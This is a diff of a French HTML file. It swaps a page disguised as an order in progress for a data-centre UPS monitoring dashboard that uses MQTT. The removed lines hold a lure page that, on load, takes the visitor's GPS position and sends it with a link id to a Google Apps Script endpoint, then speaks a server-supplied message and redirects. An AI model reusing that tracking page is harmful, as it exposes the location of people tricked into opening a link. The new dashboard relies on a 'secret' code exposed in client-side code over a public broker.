@@ -1,63 +1,85 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <title>Localisation</title>
-  <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbyzp5OBxiya8wyAF-miJ5pzz29hzHCtcFDNDpTj77gm7DSU6UUYLO0jGFLvc3C98C_l/exec";
-
-    async function sendLocation() {
-      try {
-        // 🔹 Récupère l'ID depuis l'URL (ex: ?id=1234)
-        const urlParams = new URLSearchParams(window.location.search);
-        const id = urlParams.get("id") || "inconnu";
-
-        // 🔹 Obtenir la position GPS
-        const position = await new Promise((resolve, reject) => {
-          if (!navigator.geolocation) {
-            reject(new Error("Géolocalisation non disponible."));
-          }
-          navigator.geolocation.getCurrentPosition(resolve, reject);
-        });
-
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-
-        // 🔹 Envoi via POST avec ID dynamique
-        await fetch(scriptURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-          },
-          body: `id=${encodeURIComponent(id)}&latitude=${latitude}&longitude=${longitude}`
-        });
-
-        // 🔹 Récupération de l’URL de redirection
-        const urlResp = await fetch(`${scriptURL}?data=url`);
-        const urlText = await urlResp.text();
-
-        // 🔹 Récupération du message vocal
-        const msgResp = await fetch(`${scriptURL}?data=message`);
-        const msgText = await msgResp.text();
-
-        // 🔊 Lecture
-        const utterance = new SpeechSynthesisUtterance(msgText);
-        speechSynthesis.speak(utterance);
-
-        // Redirection après 4 secondes
-        setTimeout(() => {
-          window.location.href = urlText.trim();
-        }, 4000);
-
-      } catch (error) {
-        alert("Erreur : " + error.message);
-      }
-    }
-
-    window.onload = sendLocation;
-  </script>
-</head>
-<body>
-  <h1> COMMANDE EN COURS </h1>
-</body>
-</html>
+<!doctype html>
+<html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DATA CENTER MOOV - État des onduleurs</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--navy:#0b1f3a;--bg:#f2f5f9;--card:#fff;--ink:#0f1b2d;--mut:#5b6b80;--line:#e3e9f0;--ok:#0f9d58;--okbg:#e6f6ee;--ko:#d93025;--kobg:#fdeceb;--wa:#d97706;--wabg:#fef3e0;--un:#94a3b8;--unbg:#eef1f5}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);font:14.5px/1.5 Inter,system-ui,sans-serif;-webkit-font-smoothing:antialiased;min-height:100vh}
+.nav{background:var(--navy);color:#fff}.nav .in{max-width:1100px;margin:auto;padding:14px 24px;display:flex;align-items:center;gap:14px}
+.logo{width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#2563eb,#16a34a);display:grid;place-items:center;flex:none}
+.nav b{display:block;font-size:16px;font-weight:800;letter-spacing:.05em;line-height:1.15}.nav .s{font-size:12px;color:#9fb4cc}
+.r{margin-left:auto;text-align:right;font-size:12.5px;color:#9fb4cc;line-height:1.35}.r .l{display:flex;align-items:center;justify-content:flex-end;gap:7px;color:#fff;font-weight:600}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--un)}.dot.on{background:#22c55e;animation:pl 2s infinite}
+@keyframes pl{0%{box-shadow:0 0 0 0 #22c55e99}70%,100%{box-shadow:0 0 0 8px #0000}}
+.wrap{max-width:1100px;margin:auto;padding:24px 24px 30px}
+.ok{--col:var(--ok);--bg2:var(--okbg)}.ko{--col:var(--ko);--bg2:var(--kobg)}.wa,.vf{--col:var(--wa);--bg2:var(--wabg)}.un{--col:var(--un);--bg2:var(--unbg)}
+.bn{display:flex;align-items:center;gap:22px;background:var(--card);border:1px solid var(--line);border-left:8px solid var(--col);border-radius:14px;padding:26px 30px;box-shadow:0 1px 2px #0b1f3a0a,0 12px 32px -20px #0b1f3a50;transition:border-color .3s}
+.ic{width:62px;height:62px;border-radius:50%;background:var(--bg2);color:var(--col);display:grid;place-items:center;font-size:28px;font-weight:800;flex:none}
+.bn small{font-size:11.5px;font-weight:700;letter-spacing:.14em;color:var(--mut)}.bn h1{margin:3px 0;font-size:clamp(21px,3.6vw,31px);line-height:1.15;font-weight:800;letter-spacing:-.015em;color:var(--col)}.bn p{margin:0;color:var(--mut)}
+.bk{margin-left:auto;text-align:right;font-variant-numeric:tabular-nums;font-size:clamp(28px,4.4vw,44px);font-weight:800;color:var(--col);white-space:nowrap;line-height:1.1}.bk small{display:block;letter-spacing:0;font-size:12px;font-weight:600;color:var(--mut);margin-bottom:2px}
+h2{font-size:12.5px;font-weight:700;margin:30px 0 12px;letter-spacing:.12em;color:var(--mut);text-transform:uppercase}
+.grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fill,minmax(320px,1fr))}
+.c{background:var(--card);border:1px solid var(--line);border-top:4px solid var(--col);border-radius:12px;padding:20px 22px;box-shadow:0 1px 2px #0b1f3a08}.c.dim{opacity:.55}
+.c .h{display:flex;justify-content:space-between;align-items:center;gap:8px}.c .nm{font-weight:800;font-size:17px}
+.pill{display:inline-flex;align-items:center;gap:6px;padding:3px 11px;border-radius:99px;font-size:12px;font-weight:700;background:var(--bg2);color:var(--col);white-space:nowrap}.pill:before{content:"";width:7px;height:7px;border-radius:50%;background:currentColor}
+.ok .pill:before,.ko .pill:before{animation:pl 2s infinite}
+.c .st{margin:18px 0 2px;font-size:12.5px;font-weight:700;color:var(--col);letter-spacing:.06em}.c .tm{font-size:34px;font-weight:800;letter-spacing:-.02em;font-variant-numeric:tabular-nums;line-height:1.2}.c .sub{color:var(--mut);font-size:13px}
+.f{display:grid;grid-template-columns:1fr 1fr;gap:8px 14px;margin-top:18px;padding-top:14px;border-top:1px solid var(--line);font-size:12px;color:var(--mut)}.f b{display:block;color:var(--ink);font-weight:600;font-size:13px}
+.e{background:var(--card);border:1px dashed #cdd6e2;border-radius:12px;padding:34px;text-align:center;color:var(--mut)}
+footer{text-align:center;color:var(--mut);font-size:12px;padding:6px 20px 34px}
+@media(max-width:640px){.bn{flex-wrap:wrap;padding:22px}.bk{margin:0;text-align:left}.r .u{display:none}}
+@media(prefers-reduced-motion:reduce){.dot.on,.ok .pill:before,.ko .pill:before{animation:none}}
+</style></head><body>
+<header class="nav"><div class="in"><div class="logo"><svg width="21" height="21" viewBox="0 0 24 24" fill="#fff"><path d="M13 2 4 14h6l-1 8 9-12h-6z"/></svg></div>
+<div><b>DATA CENTER MOOV</b><span class="s">Supervision des onduleurs</span></div>
+<div class="r"><div class="l"><i class="dot" id="dot"></i><span id="cn">Connexion...</span></div><div class="u" id="clk"></div></div></div></header>
+<div class="wrap">
+<section class="bn un" id="bn"><div class="ic" id="bi">…</div><div><small>ÉTAT GÉNÉRAL</small><h1 id="bt">Connexion...</h1><p id="bp"></p></div><div class="bk" id="bk"></div></section>
+<h2>Onduleurs</h2><div class="grid" id="g"></div></div>
+<footer>Surveillance en temps réel. Une coupure n'est confirmée qu'après une vérification de 2 minutes.</footer>
+<script src="https://cdn.jsdelivr.net/npm/mqtt@5.10.1/dist/mqtt.min.js"></script>
+<script>
+const CODE='datacenter-moov-k7x2q9';   // code du site (secret) : à garder identique côté module de mesure
+const CONFIRM_MS=120000;               // vérification de 2 minutes avant de conclure
+const $=s=>document.querySelector(s),pad=n=>String(n).padStart(2,'0');
+const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const ls=(k,v)=>{try{return v===undefined?JSON.parse(localStorage.getItem(k)||'null'):localStorage.setItem(k,JSON.stringify(v))}catch{return null}};
+const D={},OUT=ls('out')||{};let mq=false,sig='';
+const hm=ms=>{const d=new Date(ms);return`${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()} à ${pad(d.getHours())}:${pad(d.getMinutes())}`};
+function hms(ms){ms=Math.max(0,Math.round(ms/1000));const d=Math.floor(ms/86400),h=Math.floor(ms%86400/3600);return(d?d+' j ':'')+`${pad(h)}:${pad(Math.floor(ms%3600/60))}:${pad(ms%60)}`}
+function dur(ms){let s=Math.max(0,Math.round(ms/1000));const d=Math.floor(s/86400),h=Math.floor(s%86400/3600),m=Math.floor(s%3600/60);return d?`${d} j ${h} h`:h?`${h} h ${m} min`:m?`${m} min`:`${s} s`}
+function state(d){const O=OUT[d.id];if(d.on===undefined)return'un';if(d.on===0)return O&&O.ok?'ko':'vf';return Date.now()-(d.rx||d.stAt)>90000?'wa':'ok'}
+function step(){const now=Date.now();for(const d of Object.values(D)){let O=OUT[d.id];
+  if(d.on===0){if(!O||O.back)OUT[d.id]=O={since:d.t||d.stAt,ok:0,back:0};else if(d.t&&d.t<O.since&&!O.ok)O.since=d.t;if(!O.ok&&now-O.since>=CONFIRM_MS)O.ok=now}
+  else if(d.on===1&&O&&!O.back&&d.rx)O.back=now}ls('out',OUT)}
+function conn(){if(!window.mqtt){$('#cn').textContent='Indisponible';return}
+  const cl=mqtt.connect('wss://broker.hivemq.com:8884/mqtt',{reconnectPeriod:3000,clientId:'web-'+Math.random().toString(16).slice(2,10)});
+  cl.on('connect',()=>{mq=true;cl.subscribe(`powerwatch/${CODE}/+/+`);render()});cl.on('close',()=>{mq=false;render()});
+  cl.on('message',(t,m)=>{let j;try{j=JSON.parse(m.toString())}catch{return}const[,,id,k]=t.split('/');if(!/^[\w-]+$/.test(id||''))return;const d=D[id]=D[id]||{id};
+    if(k==='status'){d.on=j.on?1:0;if(j.n)d.n=String(j.n).slice(0,40);d.stAt=Date.now()}
+    else if(k==='info')Object.assign(d,{t:j.t?j.t*1000:0,up:+j.up||0,ip:String(j.ip||''),rx:Date.now()});
+    setTimeout(()=>{step();render()},300)})}
+const TXT={ok:'FONCTIONNE BIEN',ko:'SUR BATTERIE',vf:'VÉRIFICATION EN COURS',wa:'SIGNAL PERDU',un:'EN ATTENTE'},PIL={ok:'En service',ko:'Coupure',vf:'Vérification',wa:'Signal perdu',un:'Inconnu'};
+function render(){const ds=Object.values(D).sort((a,b)=>(a.n||a.id).localeCompare(b.n||b.id)),now=Date.now(),S=ds.map(state),nm=d=>esc(d.n||d.id),by=k=>ds.filter((d,i)=>S[i]===k);
+  let c='un',ic='…',t='En attente des données',p='Aucun onduleur détecté pour le moment.',bk='';
+  if(!mq&&!ds.length){t='Connexion au temps réel...';p=''}
+  else if(by('ko').length){c='ko';ic='⚡';const o=Math.min(...by('ko').map(d=>OUT[d.id].since));t='Onduleur sur batterie : '+by('ko').map(nm).join(', ');p='Coupure confirmée. Début le '+hm(o)+'.';bk=`<small>Durée de la coupure</small><span data-s="${o}">${hms(now-o)}</span>`}
+  else if(by('vf').length){c='wa';ic='…';const o=Math.min(...by('vf').map(d=>OUT[d.id].since));t='Vérification en cours : '+by('vf').map(nm).join(', ');p='Perte de signal détectée. Confirmation après 2 minutes.';bk=`<small>Confirmation dans</small><span data-c="${o+CONFIRM_MS}">--:--</span>`}
+  else if(by('wa').length){c='wa';ic='!';t='Signal perdu : '+by('wa').map(nm).join(', ');p='Aucune donnée reçue depuis plus de 90 secondes.'}
+  else if(ds.length){c='ok';ic='✓';t=ds.length>1?'Tous les onduleurs fonctionnent bien':'Onduleur fonctionne bien';p=ds.length>1?ds.length+' onduleurs en service, alimentation normale.':'Alimentation normale.'}
+  if(ds.length&&!mq)p='Connexion perdue, reconnexion en cours...';
+  $('#bn').className='bn '+c;$('#bi').textContent=ic;$('#bt').innerHTML=t;$('#bp').textContent=p;$('#bk').innerHTML=bk;
+  $('#dot').className='dot'+(mq?' on':'');$('#cn').textContent=mq?'Temps réel actif':'Reconnexion...';
+  document.title=(c==='ko'?'🔴 ':c==='wa'?'🟠 ':'')+'DATA CENTER MOOV - Onduleurs';
+  $('#g').innerHTML=ds.map((d,i)=>{const s=S[i],O=OUT[d.id],up=d.rx?dur(d.up*1000+now-d.rx):'-';
+    const body=s==='ok'?'<div class="tm">Courant présent</div><div class="sub">Alimentation normale</div>':
+      s==='ko'?`<div class="tm" data-s="${O.since}">${hms(now-O.since)}</div><div class="sub">sur batterie depuis le ${hm(O.since)}</div>`:
+      s==='vf'?`<div class="tm" data-c="${O.since+CONFIRM_MS}">--:--</div><div class="sub">avant confirmation de la coupure</div>`:
+      s==='wa'?`<div class="tm">?</div><div class="sub">dernière donnée il y a ${dur(now-(d.rx||d.stAt))}</div>`:'';
+    return`<article class="c ${s}${mq?'':' dim'}"><div class="h"><span class="nm">${nm(d)}</span><span class="pill">${PIL[s]}</span></div><div class="st">${TXT[s]}</div>${body}
+    <div class="f"><div>Identifiant<b>${esc(d.id)}</b></div><div>En service depuis<b>${s==='ok'?up:'-'}</b></div></div></article>`}).join('')||'<div class="e">Aucun onduleur détecté pour le moment.</div>'}
+function tick(){step();const s=Object.values(D).map(d=>d.id+state(d)+(d.n||'')).join()+mq;if(s!==sig){sig=s;render()}
+  const now=Date.now();document.querySelectorAll('[data-s]').forEach(e=>e.textContent=hms(now-e.dataset.s));document.querySelectorAll('[data-c]').forEach(e=>e.textContent=hms(e.dataset.c-now).slice(3));
+  $('#clk').textContent=new Date().toLocaleString('fr-FR',{dateStyle:'long',timeStyle:'medium'})}
+conn();render();setInterval(tick,1000);setInterval(render,30000);
+</script></body></html>
